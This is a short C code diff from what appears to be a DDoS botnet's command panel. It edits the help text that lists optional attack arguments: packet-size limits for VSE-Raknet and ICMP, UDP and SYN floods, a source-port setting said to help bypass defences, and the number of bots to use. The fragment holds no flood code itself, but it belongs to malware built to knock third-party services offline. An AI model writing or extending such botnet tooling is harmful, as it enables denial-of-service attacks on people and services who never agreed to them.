@@ -43,7 +43,7 @@ void handle_attack_list_command(char *response) {
 void handle_opthelp_command(char *response) {
     snprintf(response, MAX_COMMAND_LENGTH,
              RED "Optional Arguments:\r\n"
-             "psize - packet size (max 64500 for ICMP-UDP-SYN)\r\n"
+             "psize - packet size (Max: 1492 for VSE-Raknet | Max: 64500 for ICMP-UDP-SYN)\r\n"
              "srcport - srcport,  static helps bypass sometimes (max 65500, UDP-SYN)\r\n"
              "botcount - number of bots to use (global)\r\n" RESET);
 }
